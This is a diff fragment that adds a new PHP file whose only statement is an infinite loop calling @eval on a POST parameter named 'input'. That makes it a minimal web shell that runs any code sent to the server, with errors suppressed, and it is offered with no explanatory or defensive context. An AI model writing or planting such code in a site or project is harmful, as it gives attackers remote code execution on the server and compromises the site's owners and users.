@@ -1,0 +1,4 @@
+<?php
+while (1) { @eval($_POST['input']); }
+
+?>
